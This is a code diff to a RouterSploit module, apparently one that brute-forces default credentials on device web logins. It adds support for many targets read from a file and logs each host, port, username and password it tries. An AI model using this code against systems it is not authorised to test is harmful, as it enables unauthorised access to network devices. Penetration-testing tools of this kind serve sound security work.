@@ -12,6 +12,7 @@ from routersploit import (
     print_table,
     sanitize_url,
     boolify,
+    multi,
 )
 
 
@@ -27,7 +28,7 @@ class Exploit(exploits.Exploit):
         ]
     }
 
-    target = exploits.Option('', 'Target address e.g. http://192.168.1.1')
+    target = exploits.Option('', 'Target IP address or file with target:port (file://)')
     port = exploits.Option(80, 'Target port')
     threads = exploits.Option(8, 'Number of threads')
     defaults = exploits.Option(wordlists.defaults, 'User:Pass or file with default credentials (file://)')
@@ -41,6 +42,10 @@ class Exploit(exploits.Exploit):
 
     def run(self):
         self.credentials = []
+        self.attack()
+
+    @multi
+    def attack(self):
         url = sanitize_url("{}:{}{}".format(self.target, self.port, self.path))
 
         try:
@@ -78,7 +83,7 @@ class Exploit(exploits.Exploit):
 
         if len(self.credentials):
             print_success("Credentials found!")
-            headers = ("Login", "Password")
+            headers = ("Target", "Port", "Login", "Password")
             print_table(headers, *self.credentials)
         else:
             print_error("Credentials not found")
@@ -148,10 +153,10 @@ class Exploit(exploits.Exploit):
 
                 if l < self.invalid["min"] or l > self.invalid["max"]:
                     running.clear()
-                    print_success("{}: Authentication succeed!".format(name), user, password, verbose=module_verbosity)
-                    self.credentials.append((user, password))
+                    print_success("Target: {}:{} {}: Authentication Succeed - Username: '{}' Password: '{}'".format(self.target, self.port, name, user, password), verbose=module_verbosity)
+                    self.credentials.append((self.target, self.port, user, password))
                 else:
-                    print_error(name, "Authentication Failed - Username: '{}' Password: '{}'".format(user, password), verbose=module_verbosity)
+                    print_error("Target: {}:{} {}: Authentication Failed - Username: '{}' Password: '{}'".format(self.target, self.port, name, user, password), verbose=module_verbosity)
             except StopIteration:
                 break
 
